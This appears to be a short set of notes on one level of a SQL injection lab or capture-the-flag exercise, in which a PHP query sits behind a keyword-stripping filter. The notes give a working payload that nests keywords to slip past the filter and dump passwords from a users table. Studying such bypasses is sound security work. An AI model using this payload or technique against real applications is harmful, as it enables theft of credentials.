### Difficulty
The same query from level 1 - 
```PHP
$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
```
but before that there is a regex search and replace:
```PHP
$searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');  
$injection = preg_replace ('/' . $searchWords . '/i', '', $injection);
```
### Directions
- ~~SQL injection without `searchWords`~~ (harder)
- Bypass the `preg_replace` function in PHP logic
	- Make the replace remove the word to make the intended word, e.g:
	  If we replace read with "" from `re read ad` (without spaces) we'd get `read`
	- POC: `1 and 1=2 union select id, password as username from users`:
```SQL
1 and 1=2 uniounionn selecselectt id, password as username frofromm users
```
- ~~Same for ^^^ but in SQL~~ (harder)

	  ```SQL
	    UNIO/**/N` 
	    ```
	    Doesn't seem to work
	-  ~~[Blind SQL injection](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#BlindSQLInjections) - finding which characters in password with binary search~~- - doesn't seem to work because we need `SELECT`  and `FROM`.
